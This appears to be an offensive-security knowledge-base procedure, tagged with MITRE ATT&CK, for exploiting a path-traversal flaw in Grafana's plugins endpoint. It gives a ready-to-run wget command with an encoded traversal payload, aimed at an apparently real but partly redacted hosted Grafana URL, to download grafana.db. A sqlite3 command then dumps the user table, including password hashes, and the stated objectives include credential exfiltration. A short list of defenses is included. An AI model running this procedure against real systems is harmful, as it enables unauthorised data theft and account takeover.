---
id: proc-download-query-grafana-db
tags:
  - database-exfil
  - sqlite
  - user-enumeration
type: procedure
tools:
  - '[[tools/wget]]'
  - '[[tools/sqlite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/wget-download-sqlite-db]]'
  - '[[commands/sqlite-query-user-table]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.767Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
  - '[[Exploit Public-Facing Application]]'
---
# Download-and-Query-Grafana-SQLite-Database

## Summary

This procedure downloads the Grafana SQLite database via path traversal and queries it to extract user data, achieving full data exfiltration.

## Description

Traverse to /var/lib/grafana/grafana.db using the plugins endpoint, download with wget following redirects, then use sqlite3 to query the 'user' table. This exposes all Grafana users, dashboards, and credentials, leading to potential account takeover.

## Requirements

1. Vulnerable Grafana URL
2. wget and sqlite3 installed locally
3. Write access to download directory

## Defense

Defensive measures and detection strategies:

- Encrypt or relocate the SQLite database outside web root
- Implement database access controls and monitor file downloads
- Use WAF to block large file requests to plugins endpoint

## Objectives

1. Download the database file
2. Query user table for sensitive data
3. Exfiltrate user credentials

## Instructions

### Step 1: Download Database

**Context**: Use traversal to fetch the SQLite file.

**Command** ([[commands/wget-download-sqlite-db]]):
```bash
wget -L -O ~/Downloads/grafana.db https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db
```

> File saves as grafana.db; -L follows any redirects.

### Step 2: Query Database

**Context**: Open and select from user table.

**Command** ([[commands/sqlite-query-user-table]]):
```bash
sqlite3 ~/Downloads/grafana.db "select * from user;"
```

> Outputs columns like id, login, email, password hash.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/wget-download-sqlite-db]]
- [[commands/sqlite-query-user-table]]

## Tools Used

- [[tools/wget]]
- [[tools/sqlite]]

## Tags

- database-exfil
- sqlite
- user-enumeration
